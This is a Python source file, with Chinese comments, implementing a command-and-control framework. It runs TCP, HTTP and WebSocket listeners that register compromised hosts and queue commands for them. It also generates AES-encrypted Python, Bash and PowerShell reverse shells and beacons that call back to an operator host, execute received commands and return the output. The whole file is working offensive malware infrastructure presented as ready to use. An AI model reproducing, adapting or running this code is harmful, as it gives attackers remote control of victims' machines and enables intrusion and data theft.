"""C2 框架（legacy 纯 Python 实现）— 仅在 Go 守护进程不可用时回退使用"""
import asyncio
import json
import os
import secrets
import socket
import struct
import subprocess
import threading
import base64
from hashlib import sha256
from typing import Optional

from app_config.logging_config import get_logger
from services.db_service import db

log = get_logger(__name__)


class C2Encryption:
    """C2 通信加密 — AES-256-CTR 或 XOR"""

    @staticmethod
    def generate_key() -> str:
        return secrets.token_hex(32)  # 256-bit

    @staticmethod
    def encrypt(plaintext: str, key_hex: str, encryption_type: str = "aes-256-ctr") -> str:
        if encryption_type == "xor":
            key = key_hex.encode()[:32]
            data = plaintext.encode()
            encrypted = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
            return base64.b64encode(encrypted).decode()
        # AES-256-CTR (默认)
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            key = bytes.fromhex(key_hex)
            iv = os.urandom(16)
            cipher = Cipher(algorithms.AES(key), modes.CTR(iv))
            encryptor = cipher.encryptor()
            ct = encryptor.update(plaintext.encode()) + encryptor.finalize()
            return base64.b64encode(iv + ct).decode()
        except ImportError:
            # 回退 XOR
            key = key_hex.encode()[:32]
            data = plaintext.encode()
            encrypted = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
            return base64.b64encode(encrypted).decode()

    @staticmethod
    def decrypt(cipher_b64: str, key_hex: str, encryption_type: str = "aes-256-ctr") -> str:
        if encryption_type == "xor":
            key = key_hex.encode()[:32]
            raw = base64.b64decode(cipher_b64)
            decrypted = bytes([raw[i] ^ key[i % len(key)] for i in range(len(raw))])
            return decrypted.decode()
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            key = bytes.fromhex(key_hex)
            raw = base64.b64decode(cipher_b64)
            iv, ct = raw[:16], raw[16:]
            cipher = Cipher(algorithms.AES(key), modes.CTR(iv))
            decryptor = cipher.decryptor()
            return (decryptor.update(ct) + decryptor.finalize()).decode()
        except ImportError:
            key = key_hex.encode()[:32]
            raw = base64.b64decode(cipher_b64)
            decrypted = bytes([raw[i] ^ key[i % len(key)] for i in range(len(raw))])
            return decrypted.decode()


class C2Service:
    """C2 框架核心"""

    def __init__(self):
        self._tcp_servers: dict[str, asyncio.AbstractServer] = {}
        self._http_runners: dict[str, object] = {}  # aiohttp AppRunner
        self._ws_sites: dict[str, object] = {}      # aiohttp TCPSite
        self._running = False

    # ── 监听器管理 ──

    async def start_listener(self, lid: str, name: str, listener_type: str,
                              host: str, port: int) -> dict:
        """启动 C2 监听器"""
        info = db.list_listeners()
        li = next((l for l in info if l["id"] == lid), None)
        if not li:
            return {"error": "监听器不存在"}

        secret = li.get("secret", "")
        if not secret:
            secret = C2Encryption.generate_key()
            db.update_listener(lid, secret=secret)

        try:
            if listener_type == "tcp":
                await self._start_tcp(lid, host, port, secret)
            elif listener_type == "http":
                await self._start_http(lid, host, port, secret)
            elif listener_type == "ws":
                await self._start_ws(lid, host, port, secret)
            else:
                return {"error": f"不支持的监听器类型: {listener_type}"}

            db.update_listener(lid, status="running")
            log.info(f"C2 监听器已启动: {name} ({listener_type}://{host}:{port})")
            return {"status": "running", "lid": lid, "host": host, "port": port}
        except Exception as e:
            log.error(f"启动监听器失败: {e}")
            return {"error": str(e)}

    async def stop_listener(self, lid: str) -> dict:
        """停止 C2 监听器（TCP/HTTP/WS 通用）"""
        if lid in self._tcp_servers:
            self._tcp_servers[lid].close()
            await self._tcp_servers[lid].wait_closed()
            del self._tcp_servers[lid]
        if lid in self._http_runners:
            await self._http_runners[lid].cleanup()
            del self._http_runners[lid]
        if lid in self._ws_sites:
            await self._ws_sites[lid].stop()
            del self._ws_sites[lid]
        db.update_listener(lid, status="stopped")
        return {"status": "stopped"}

    async def _start_tcp(self, lid: str, host: str, port: int, secret: str):
        """启动 TCP 反向连接监听器"""
        async def handle_client(reader: asyncio.StreamReader,
                                 writer: asyncio.StreamWriter):
            peername = writer.get_extra_info("peername")
            remote = f"{peername[0]}:{peername[1]}" if peername else "unknown"
            log.info(f"C2 新会话: {remote}")

            # 读取初始握手（加密的注册信息）
            try:
                data = await asyncio.wait_for(reader.read(4096), timeout=10)
                if data:
                    try:
                        decoded = C2Encryption.decrypt(data.decode(), secret)
                        reg = json.loads(decoded)
                    except Exception:
                        reg = {"hostname": remote, "username": "unknown", "os": "unknown"}
                else:
                    reg = {"hostname": remote, "username": "unknown", "os": "unknown"}
            except asyncio.TimeoutError:
                reg = {"hostname": remote, "username": "unknown", "os": "unknown"}

            session = db.create_session(
                listener_id=lid,
                remote_addr=remote,
                hostname=reg.get("hostname", ""),
                username=reg.get("username", ""),
                os_info=reg.get("os", ""),
            )
            sid = session["id"]
            log.info(f"会话已注册: {sid} ({remote})")

            # 会话循环：拉取任务 → 返回结果
            try:
                while True:
                    tasks = db.list_c2_tasks(sid)
                    pending = [t for t in tasks if t["status"] == "pending"]
                    cmd = None
                    for t in pending:
                        cmd = t["command"]
                        db.update_c2_task(t["id"], status="sent")
                        break

                    if cmd:
                        encrypted = C2Encryption.encrypt(json.dumps(
                            {"type": "exec", "command": cmd}), secret)
                        writer.write((encrypted + "\n").encode())
                        await writer.drain()

                        # 读取执行结果
                        resp = await asyncio.wait_for(reader.read(8192), timeout=60)
                        try:
                            result = C2Encryption.decrypt(resp.decode().strip(), secret)
                            for t in pending:
                                db.update_c2_task(t["id"], result=result[:5000])
                        except Exception:
                            pass
                    else:
                        # 心跳
                        encrypted = C2Encryption.encrypt(json.dumps(
                            {"type": "heartbeat"}), secret)
                        writer.write((encrypted + "\n").encode())
                        await writer.drain()

                    db.update_session(sid, status="active")
                    await asyncio.sleep(5)  # 轮询间隔
            except (ConnectionResetError, BrokenPipeError, asyncio.TimeoutError):
                log.warning(f"会话断开: {sid}")
            except Exception as e:
                log.error(f"会话异常: {sid} - {e}")
            finally:
                db.update_session(sid, status="dead")
                writer.close()

        server = await asyncio.start_server(handle_client, host, port)
        self._tcp_servers[lid] = server
        _ = asyncio.create_task(server.serve_forever())

    async def _start_http(self, lid: str, host: str, port: int, secret: str):
        """启动 HTTP Beacon 监听器（使用内置 HTTP 服务器）"""
        from aiohttp import web

        async def beacon_handler(request):
            data = await request.text()
            result_text = ""
            try:
                decrypted = C2Encryption.decrypt(data, secret)
                beacon_data = json.loads(decrypted)

                remote = request.remote or "unknown"
                # 检查是否已有活跃会话
                existing = [s for s in db.list_sessions()
                            if s["remote_addr"] == remote and s["listener_id"] == lid and s["status"] == "active"]
                if existing:
                    sid = existing[0]["id"]
                    db.update_session(sid,
                        hostname=beacon_data.get("hostname", ""),
                        username=beacon_data.get("username", ""),
                        os_info=beacon_data.get("os", ""),
                    )
                else:
                    session = db.create_session(
                        listener_id=lid,
                        remote_addr=remote,
                        hostname=beacon_data.get("hostname", ""),
                        username=beacon_data.get("username", ""),
                        os_info=beacon_data.get("os", ""),
                    )
                    sid = session["id"]

                # 检查是否有待执行任务
                tasks = db.list_c2_tasks(sid)
                pending = [t for t in tasks if t["status"] == "pending"]
                if pending:
                    t = pending[0]
                    db.update_c2_task(t["id"], status="sent")
                    result_text = json.dumps({"type": "exec", "command": t["command"]})
                else:
                    result_text = json.dumps({"type": "heartbeat"})

                # 更新会话
                db.update_session(sid, status="active")

            except Exception as e:
                log.warning(f"HTTP beacon 处理失败: {e}")
                result_text = json.dumps({"type": "heartbeat"})

            encrypted = C2Encryption.encrypt(result_text, secret)
            return web.Response(text=encrypted, content_type="text/plain")

        app = web.Application()
        app.router.add_post("/beacon", beacon_handler)
        runner = web.AppRunner(app)
        await runner.setup()
        site = web.TCPSite(runner, host, port)
        await site.start()
        self._http_runners[lid] = runner
        log.info(f"HTTP Beacon 监听器: {host}:{port}")

    async def _start_ws(self, lid: str, host: str, port: int, secret: str):
        """启动 WebSocket 监听器"""
        import aiohttp
        from aiohttp import web

        async def ws_handler(request):
            ws = web.WebSocketResponse()
            await ws.prepare(request)
            remote = request.remote or "unknown"
            log.info(f"WS 新连接: {remote}")

            session = db.create_session(listener_id=lid, remote_addr=remote)
            sid = session["id"]

            try:
                async for msg in ws:
                    if msg.type == web.WSMsgType.TEXT:
                        try:
                            decrypted = C2Encryption.decrypt(msg.data, secret)
                            data = json.loads(decrypted)

                            # 注册信息
                            if data.get("type") == "register":
                                db.update_session(sid,
                                    hostname=data.get("hostname", ""),
                                    username=data.get("username", ""),
                                    os_info=data.get("os", ""),
                                )
                            # 任务结果
                            elif data.get("type") == "result":
                                task_id = data.get("task_id", "")
                                result = data.get("output", "")
                                if task_id:
                                    db.update_c2_task(task_id, result=result)

                            # 检查待处理任务
                            tasks = db.list_c2_tasks(sid)
                            pending = [t for t in tasks if t["status"] == "pending"]
                            if pending:
                                t = pending[0]
                                db.update_c2_task(t["id"], status="sent")
                                response = C2Encryption.encrypt(json.dumps(
                                    {"type": "exec", "command": t["command"], "task_id": t["id"]}), secret)
                                await ws.send_str(response)
                            else:
                                response = C2Encryption.encrypt(json.dumps(
                                    {"type": "heartbeat"}), secret)
                                await ws.send_str(response)

                            db.update_session(sid, status="active")
                        except Exception as e:
                            log.warning(f"WS 消息处理失败: {e}")
                    elif msg.type == web.WSMsgType.ERROR:
                        log.error(f"WS 错误: {ws.exception()}")
            except Exception:
                pass
            finally:
                db.update_session(sid, status="dead")
            return ws

        app = web.Application()
        app.router.add_get("/beacon", ws_handler)
        runner = web.AppRunner(app)
        await runner.setup()
        site = web.TCPSite(runner, host, port)
        await site.start()
        self._ws_sites[lid] = site
        log.info(f"WS 监听器: {host}:{port}")

    # ── Payload 生成 ──

    def gen_payload(self, payload_type: str = "python", host: str = "127.0.0.1",
                    port: int = 4444, secret: str = "", template_id: str = "") -> dict:
        """生成被控端 Payload，支持 DB 自定义模板"""
        if not secret:
            secret = C2Encryption.generate_key()

        # 如果指定了自定义模板
        if template_id:
            tmpl = db.get_payload_template(template_id)
            if tmpl:
                code = tmpl.get("content", "")
                code = code.replace("{host}", host).replace("{port}", str(port)).replace("{secret}", secret)
                return {
                    "type": tmpl.get("payload_type", payload_type),
                    "host": host, "port": port,
                    "code": code,
                    "instructions": f"在目标上执行此 {tmpl.get('payload_type', payload_type)} 命令",
                    "template_name": tmpl.get("name", ""),
                }

        payloads = {
            "python": self._gen_python(host, port, secret),
            "powershell": self._gen_powershell(host, port, secret),
            "bash": self._gen_bash(host, port, secret),
            "python_http": self._gen_python_http(host, port, secret),
            "python_ws": self._gen_python_ws(host, port, secret),
        }

        code = payloads.get(payload_type)
        if not code:
            return {"error": f"不支持的 Payload 类型: {payload_type}",
                    "supported": list(payloads.keys())}

        return {
            "type": payload_type,
            "host": host,
            "port": port,
            "code": code,
            "instructions": f"在目标上执行此 {payload_type} 命令",
        }

    @staticmethod
    def _gen_python(host: str, port: int, secret: str) -> str:
        """生成 Python TCP Reverse Shell"""
        b64key = base64.b64encode(bytes.fromhex(secret)).decode()
        return f'''python3 -c "
import socket,subprocess,os,json,base64
s=socket.socket();s.connect(('{host}',{port}))
key=base64.b64decode('{b64key}').hex()
import hashlib
def encrypt(d,k):
 from cryptography.hazmat.primitives.ciphers import Cipher,algorithms,modes
 import os;iv=os.urandom(16);c=Cipher(algorithms.AES(bytes.fromhex(k)),modes.CTR(iv));e=c.encryptor()
 return base64.b64encode(iv+e.update(d.encode())+e.finalize()).decode()
def decrypt(d,k):
 from cryptography.hazmat.primitives.ciphers import Cipher,algorithms,modes
 r=base64.b64decode(d);iv,ct=r[:16],r[16:];c=Cipher(algorithms.AES(bytes.fromhex(k)),modes.CTR(iv));dd=c.decryptor()
 return (dd.update(ct)+dd.finalize()).decode()
reg=encrypt(json.dumps({{'hostname':socket.gethostname(),'username':os.getlogin(),'os':'python'}}),key)
s.send((reg+'\\n').encode())
while True:
 d=s.recv(8192).decode().strip()
 if not d:break
 msg=json.loads(decrypt(d,key))
 if msg['type']=='heartbeat':continue
 if msg['type']=='exec':
  r=subprocess.getoutput(msg.get('command',''))
  s.send((encrypt(json.dumps({{'type':'result','output':r}}),key)+'\\n').encode())
s.close()
"'''

    @staticmethod
    def _gen_powershell(host: str, port: int, secret: str) -> str:
        """生成 PowerShell Reverse Shell (AES-CBC 加密)"""
        b64key = base64.b64encode(bytes.fromhex(secret)).decode()
        return f'''powershell -NoProfile -NonInteractive -Command "
$k=[System.Convert]::FromBase64String('{b64key}');
$c=New-Object System.Net.Sockets.TCPClient('{host}',{port});
$s=$c.GetStream();
[byte[]]$b=0..65535|%{{0}};
# 发送加密注册信息
$reg=@{{'hostname'=$env:COMPUTERNAME;'username'=$env:USERNAME;'os'='windows'}}|ConvertTo-Json;
$iv=New-Object byte[] 16;
(New-Object Security.Cryptography.RNGCryptoServiceProvider).GetBytes($iv);
$enc=[System.Text.Encoding]::UTF8.GetBytes($reg);
$aes=[System.Security.Cryptography.Aes]::Create();
$aes.Key=$k;$aes.IV=$iv;$aes.Mode=[System.Security.Cryptography.CipherMode]::CBC;
$encryptor=$aes.CreateEncryptor();
$ct=$encryptor.TransformFinalBlock($enc,0,$enc.Length);
$data=$iv+$ct;
$s.Write($data,0,$data.Length);$s.Flush();
while(($i=$s.Read($b,0,$b.Length)) -ne 0){{
    $raw=New-Object byte[] $i;[Array]::Copy($b,0,$raw,0,$i);
    $r_iv=$raw[0..15];$r_ct=$raw[16..($i-1)];
    $aes2=[System.Security.Cryptography.Aes]::Create();
    $aes2.Key=$k;$aes2.IV=$r_iv;$aes2.Mode=[System.Security.Cryptography.CipherMode]::CBC;
    $d=$aes2.CreateDecryptor().TransformFinalBlock($r_ct,0,$r_ct.Length);
    $cmd=[System.Text.Encoding]::UTF8.GetString($d);
    $msg=$cmd|ConvertFrom-Json;
    if($msg.type -eq 'heartbeat'){{continue}}
    if($msg.type -eq 'exec'){{
        $r=iex $msg.command 2>&1 | Out-String;
        $r_data=@{{'type'='result';'output'=$r}}|ConvertTo-Json;
        $r_iv2=New-Object byte[] 16;
        (New-Object Security.Cryptography.RNGCryptoServiceProvider).GetBytes($r_iv2);
        $r_aes=[System.Security.Cryptography.Aes]::Create();
        $r_aes.Key=$k;$r_aes.IV=$r_iv2;$r_aes.Mode=[System.Security.Cryptography.CipherMode]::CBC;
        $r_enc=[System.Text.Encoding]::UTF8.GetBytes($r_data);
        $r_ct2=$r_aes.CreateEncryptor().TransformFinalBlock($r_enc,0,$r_enc.Length);
        $s.Write($r_iv2+$r_ct2,0,$r_iv2.Length+$r_ct2.Length);$s.Flush()
    }}
}}
$c.Close()
"'''

    @staticmethod
    def _gen_bash(host: str, port: int, secret: str) -> str:
        """生成 Bash Reverse Shell (AES-256-CTR 加密)"""
        b64key = base64.b64encode(bytes.fromhex(secret)).decode()
        return f'''python3 -c "
import socket,subprocess,os,json,base64
s=socket.socket();s.connect(('{host}',{port}))
key=base64.b64decode('{b64key}').hex()
from cryptography.hazmat.primitives.ciphers import Cipher,algorithms,modes
def encrypt(d,k):
 import os;iv=os.urandom(16);c=Cipher(algorithms.AES(bytes.fromhex(k)),modes.CTR(iv));e=c.encryptor()
 return base64.b64encode(iv+e.update(d.encode())+e.finalize()).decode()
def decrypt(d,k):
 r=base64.b64decode(d);iv,ct=r[:16],r[16:];c=Cipher(algorithms.AES(bytes.fromhex(k)),modes.CTR(iv));dd=c.decryptor()
 return (dd.update(ct)+dd.finalize()).decode()
reg=encrypt(json.dumps({{'hostname':socket.gethostname(),'username':os.getlogin(),'os':'nix'}}),key)
s.send((reg+'\\n').encode())
while True:
 d=s.recv(8192).decode().strip()
 if not d:break
 msg=json.loads(decrypt(d,key))
 if msg['type']=='heartbeat':continue
 if msg['type']=='exec':
  r=subprocess.getoutput(msg.get('command',''))
  s.send((encrypt(json.dumps({{'type':'result','output':r}}),key)+'\\n').encode())
s.close()
"'''

    @staticmethod
    def _gen_python_http(host: str, port: int, secret: str) -> str:
        """生成 Python HTTP Beacon"""
        b64key = base64.b64encode(bytes.fromhex(secret)).decode()
        return f'''python3 -c "
import urllib.request,json,base64,socket,os,subprocess
key=base64.b64decode('{b64key}').hex()
from cryptography.hazmat.primitives.ciphers import Cipher,algorithms,modes
def encrypt(d,k):
 import os;iv=os.urandom(16);c=Cipher(algorithms.AES(bytes.fromhex(k)),modes.CTR(iv));e=c.encryptor()
 return base64.b64encode(iv+e.update(d.encode())+e.finalize()).decode()
def decrypt(d,k):
 r=base64.b64decode(d);iv,ct=r[:16],r[16:];c=Cipher(algorithms.AES(bytes.fromhex(k)),modes.CTR(iv));dd=c.decryptor()
 return (dd.update(ct)+dd.finalize()).decode()
while True:
 data=encrypt(json.dumps({{'hostname':socket.gethostname(),'os':'python'}}),key)
 try:
  r=urllib.request.Request('http://{host}:{port}/beacon',data=data.encode())
  resp=urllib.request.urlopen(r,timeout=10)
  msg=json.loads(decrypt(resp.read().decode(),key))
  if msg['type']=='exec':
   out=subprocess.getoutput(msg['command'])
   data2=encrypt(json.dumps({{'type':'result','output':out}}),key)
   urllib.request.urlopen('http://{host}:{port}/beacon',data=data2.encode(),timeout=10)
 except:pass
 import time;time.sleep(5)
"'''

    @staticmethod
    def _gen_python_ws(host: str, port: int, secret: str) -> str:
        """生成 Python WebSocket Beacon (AES-256-CTR 加密)"""
        b64key = base64.b64encode(bytes.fromhex(secret)).decode()
        return f'''python3 -c "
import asyncio,json,base64,os,subprocess,socket
key=base64.b64decode('{b64key}').hex()
from cryptography.hazmat.primitives.ciphers import Cipher,algorithms,modes
def encrypt(d,k):
 iv=os.urandom(16);c=Cipher(algorithms.AES(bytes.fromhex(k)),modes.CTR(iv));e=c.encryptor()
 return base64.b64encode(iv+e.update(d.encode())+e.finalize()).decode()
def decrypt(d,k):
 r=base64.b64decode(d);iv,ct=r[:16],r[16:];c=Cipher(algorithms.AES(bytes.fromhex(k)),modes.CTR(iv));dd=c.decryptor()
 return (dd.update(ct)+dd.finalize()).decode()
import aiohttp
async def run():
 async with aiohttp.ClientSession() as sess:
  async with sess.ws_connect('ws://{host}:{port}/beacon') as ws:
   reg=encrypt(json.dumps({{'type':'register','hostname':socket.gethostname(),'os':'python'}}),key)
   await ws.send_str(reg)
   async for msg in ws:
    cmd=decrypt(msg.data,key)
    data=json.loads(cmd)
    if data['type']=='exec':
     out=subprocess.getoutput(data['command'])
     resp=encrypt(json.dumps({{'type':'result','task_id':data.get('task_id',''),'output':out}}),key)
     await ws.send_str(resp)
asyncio.run(run())
"'''

    def get_status(self) -> dict:
        return {
            "running_listeners": len(self._tcp_servers),
            "total_sessions": len(db.list_sessions()),
        }


c2_service = C2Service()
